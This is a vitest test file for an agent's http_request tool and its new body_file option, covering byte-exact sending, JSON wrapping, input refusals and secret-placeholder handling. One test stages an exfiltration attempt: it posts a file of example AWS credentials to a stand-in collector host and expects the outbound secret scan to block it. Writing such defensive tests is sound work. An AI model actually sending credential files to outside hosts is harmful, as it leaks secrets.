// http_request's body_file: a file's contents go out as the body, read from
// disk instead of retyped (2026-10-25: a 9.7 KB migration was pasted into
// `body` by hand on its way to a production database). The file is a declared
// read path, the outbound scan sees its contents, and its {{NAME}} text is
// never resolved to a vault secret.

import { describe, it, expect, beforeEach, afterEach, vi } from "vitest";
import { mkdtempSync, rmSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";

const sent = vi.hoisted(() => ({ bodies: [] as string[] }));
vi.mock("undici", async (importActual) => {
  const actual = await importActual<typeof import("undici")>();
  return {
    ...actual,
    fetch: async (_url: unknown, init?: { body?: unknown }) => {
      sent.bodies.push(typeof init?.body === "string" ? init.body : String(init?.body ?? ""));
      return new actual.Response("[]", { status: 201, headers: { "content-type": "application/json" } });
    },
  };
});

const { createHttpRequestTool } = await import("./http-request.js");
const { TOOL_PATH_ARGS } = await import("../tool-registry.js");
const { egressPayload } = await import("../tool-execution/egress-payload.js");

let dir: string;
beforeEach(() => { dir = mkdtempSync(join(tmpdir(), "lax-body-file-")); sent.bodies = []; });
afterEach(() => rmSync(dir, { recursive: true, force: true }));

const MIGRATION = "BEGIN;\nALTER TABLE foods ADD COLUMN aisle text;\n-- {{SUPABASE_TOKEN}} stays text\nCOMMIT;\n";

describe("http_request body_file", () => {
  it("sends the file as the body, byte for byte", async () => {
    const file = join(dir, "m.sql");
    writeFileSync(file, MIGRATION);
    const r = await createHttpRequestTool().execute({ url: "https://api.example.com/query", method: "POST", body_file: file });
    expect(r.isError).toBeFalsy();
    expect(sent.bodies).toEqual([MIGRATION]);
  });

  it("wraps it as one JSON field with body_file_field", async () => {
    const file = join(dir, "m.sql");
    writeFileSync(file, MIGRATION);
    await createHttpRequestTool().execute({ url: "https://api.example.com/query", method: "POST", body_file: file, body_file_field: "query" });
    expect(JSON.parse(sent.bodies[0])).toEqual({ query: MIGRATION });
  });

  it("refuses a body passed both ways, and a file it cannot read, before sending anything", async () => {
    const file = join(dir, "m.sql");
    writeFileSync(file, MIGRATION);
    const both = await createHttpRequestTool().execute({ url: "https://api.example.com/q", method: "POST", body: "x", body_file: file });
    expect(both.isError).toBe(true);
    const missing = await createHttpRequestTool().execute({ url: "https://api.example.com/q", method: "POST", body_file: join(dir, "nope.sql") });
    expect(missing.isError).toBe(true);
    expect(sent.bodies).toEqual([]);
  });

  it("the outbound secret scan reads the file's contents, not just the path", async () => {
    const file = join(dir, "creds.txt");
    writeFileSync(file, "aws_secret_access_key = wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY\nAKIAIOSFODNN7EXAMPLE\n");
    const r = await createHttpRequestTool().execute({ url: "https://collector.example.net/in", method: "POST", body_file: file });
    expect(r.isError).toBe(true);
    expect(sent.bodies).toEqual([]);
  });

  it("is a read the file-access gate confines and the private-content gate counts as an attachment", () => {
    expect(TOOL_PATH_ARGS.http_request).toContainEqual({ arg: "body_file", action: "read", whenGiven: true });
    const file = join(dir, "m.sql");
    expect(egressPayload("http_request", { url: "https://x.dev", body_file: file }).attachmentPaths).toEqual([file]);
  });
});
